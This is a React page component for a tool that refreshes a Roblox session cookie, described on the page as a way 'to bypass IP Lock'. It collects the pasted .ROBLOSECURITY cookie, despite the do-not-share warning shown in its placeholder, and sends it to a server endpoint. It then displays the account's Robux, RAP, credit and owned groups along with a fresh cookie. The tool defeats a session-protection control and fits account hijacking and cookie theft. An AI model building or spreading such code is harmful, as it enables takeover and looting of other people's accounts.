'use client';

import { useState } from 'react';
import { ParticlesCanvas } from '@/components/particles-canvas';
import { UserInfoModal } from '@/components/user-info-modal';

interface UserData {
  id: number;
  name: string;
  displayName: string;
  avatarUrl: string;
  robux: number;
  pendingRobux: number;
  summary: number;
  rap: number;
  credit: number;
  groupsOwned: number;
}

export default function RefreshCookie() {
  const [cookie, setCookie] = useState('');
  const [showUserInfo, setShowUserInfo] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [userData, setUserData] = useState<UserData | null>(null);
  const [newCookie, setNewCookie] = useState('');
  const [cookieRefreshed, setCookieRefreshed] = useState(false);

  const handleRefresh = async () => {
    if (!cookie.trim()) {
      setError('Please enter a cookie first.');
      setTimeout(() => setError(''), 3000);
      return;
    }

    setIsLoading(true);
    setError('');

    try {
      const res = await fetch('/api/refresh-cookie', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie: cookie.trim() }),
      });

      const data = await res.json();

      if (!res.ok) {
        setError(data.error || 'Failed to refresh cookie.');
        setTimeout(() => setError(''), 5000);
        return;
      }

      setUserData(data.user);
      setNewCookie(data.newCookie);
      setCookieRefreshed(data.cookieRefreshed);
    } catch {
      setError('Network error. Please try again.');
      setTimeout(() => setError(''), 5000);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="relative w-full min-h-screen bg-black flex items-center justify-center overflow-hidden">
      {/* Particle background */}
      <ParticlesCanvas />

      {/* Content */}
      <div className="relative z-10 w-full max-w-xl px-6">
        <div className="space-y-6">
          {/* Header */}
          <div>
            <h1 className="text-xl font-semibold text-white">Refresh Cookie</h1>
            <p className="text-gray-500 mt-1">
              Refresh ROBLOX cookie to bypass IP Lock.
            </p>
          </div>

          {/* Cookie Input */}
          <div className="flex items-center gap-3 border border-gray-700 rounded-lg px-4 py-3 bg-black/50">
            <svg
              className="w-5 h-5 text-gray-400 flex-shrink-0"
              viewBox="0 0 24 24"
              fill="currentColor"
              aria-hidden="true"
            >
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z" />
            </svg>
            <input
              type="text"
              value={cookie}
              onChange={(e) => setCookie(e.target.value)}
              placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow..."
              className="flex-1 bg-transparent text-gray-300 placeholder-gray-600 text-sm focus:outline-none"
            />
          </div>

          {/* User Information Toggle */}
          <div className="space-y-3">
            <button
              type="button"
              onClick={() => setShowUserInfo(!showUserInfo)}
              className="flex items-center gap-2 cursor-pointer"
            >
              <div
                className={`w-5 h-5 rounded border-2 flex items-center justify-center transition-colors ${
                  showUserInfo
                    ? 'bg-red-500 border-red-500'
                    : 'border-red-500 bg-transparent'
                }`}
              >
                {showUserInfo && (
                  <svg className="w-3 h-3 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                  </svg>
                )}
              </div>
              <span className="text-red-500 font-semibold text-sm uppercase tracking-wide">
                User Information
              </span>
            </button>

            {/* Read-only cookie display */}
            {showUserInfo && (
              <textarea
                readOnly
                value={cookie}
                className="w-full h-44 bg-black/30 border border-gray-700 rounded-lg p-4 text-gray-300 text-sm font-mono leading-relaxed resize-none focus:outline-none break-all"
              />
            )}
          </div>

          {/* Error Message */}
          {error && (
            <div className="bg-red-500/20 text-red-400 text-sm text-center py-2 px-4 rounded-lg font-medium">
              {error}
            </div>
          )}

          {/* Refresh Button */}
          <button
            onClick={handleRefresh}
            disabled={isLoading}
            className="w-full py-3 px-4 rounded-lg font-semibold text-white transition-all duration-200 disabled:cursor-not-allowed"
            style={{
              background: isLoading
                ? 'rgba(239, 68, 68, 0.5)'
                : 'linear-gradient(135deg, #ef4444 0%, #f87171 50%, #ef4444 100%)',
            }}
          >
            {isLoading ? 'Refreshing...' : 'Refresh'}
          </button>
        </div>
      </div>

      {/* User Info Modal */}
      {userData && (
        <UserInfoModal
          user={userData}
          newCookie={newCookie}
          cookieRefreshed={cookieRefreshed}
          onClose={() => setUserData(null)}
        />
      )}
    </div>
  );
}
